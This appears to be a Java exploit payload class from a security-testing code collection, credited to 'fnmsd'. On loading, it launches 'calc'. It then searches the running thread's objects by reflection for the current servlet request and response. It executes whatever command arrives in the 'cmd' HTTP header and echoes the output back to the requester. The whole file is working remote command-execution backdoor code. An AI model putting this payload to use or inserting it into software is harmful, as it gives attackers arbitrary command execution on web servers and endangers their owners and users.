package org.joychou;
//Author:fnmsd
//Blog:https://blog.csdn.net/fnmsd

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.HashSet;
import java.util.Scanner;

public class FindClass {

    static HashSet<Object> have_processed;
    static Class ReqC = HttpServletRequest.class;
    static Class RespC = HttpServletResponse.class;
    static HttpServletRequest req;
    static HttpServletResponse resp;
    static int max_depth = 50;

    static {
        start();

        try{
            Runtime.getRuntime().exec("calc");
        }catch (Exception e){
            e.printStackTrace();
        }

    }
    public FindClass(){
        start();

    }
    private static void start(){
        req = null;
        resp = null;
        have_processed =new HashSet<>();
        Find(Thread.currentThread(),0);
    }
    private static boolean isSkiped(Object obj){
        if(obj==null||have_processed.contains(obj)){
            return true;
        }
        Class a = obj.getClass();
        if(a.isPrimitive()||a.toString().startsWith("java.lang")){
            return true;
        }
        have_processed.add(obj);
        return false;
    }
    private static void proc(Object obj,int depth){
        if(depth > max_depth||(req!=null&&resp!=null)){
            return;
        }
        if(!isSkiped(obj)){
            if(req==null&&ReqC.isAssignableFrom(obj.getClass())){
                req = (HttpServletRequest)obj;
                if(req.getHeader("cmd")==null)
                    req=null;

            }else if(resp==null&&RespC.isAssignableFrom(obj.getClass())){
                resp = (HttpServletResponse) obj;

            }
            if(req!=null&&resp!=null){
                try {
                    Runtime.getRuntime().exec("calc");

                    PrintWriter os = resp.getWriter();
                    Process proc = Runtime.getRuntime().exec(req.getHeader("cmd"));
                    proc.waitFor();
                    Scanner scanner = new Scanner(proc.getInputStream());
                    scanner.useDelimiter("\\A");
                    os.print("Test by fnmsd "+scanner.next());
                    os.flush();
                }catch (Exception e){

                }
                return;
            }
            Find(obj,depth+1);
        }
    }
    private static void Find(Object start,int depth){
        if(depth > max_depth||(req!=null&&resp!=null)){
            return;
        }
        Class n=start.getClass();
        do{
            for (Field declaredField : n.getDeclaredFields()) {
                declaredField.setAccessible(true);
                Object obj = null;
                try{
                    if(Modifier.isStatic(declaredField.getModifiers())){
                        // static filed
                        //obj = declaredField.get(null);
                    }else{
                        obj = declaredField.get(start);
                    }

                    // 参考：https://github.com/shadowsock5/Poc/blob/master/Nexus/Echo_WebContext.java
                    if(obj != null){
                        if(!obj.getClass().isArray()){
                            proc(obj,depth);
                        }else{
                            if(!obj.getClass().getComponentType().isPrimitive()) {
                                for (Object o : (Object[]) obj) {
                                    proc(o, depth);
                                }
                            }

                        }
                    }

                }catch (Exception e){
                    e.printStackTrace();
                }
            }

        }while(
                (n = n.getSuperclass())!=null
        );
    }
}

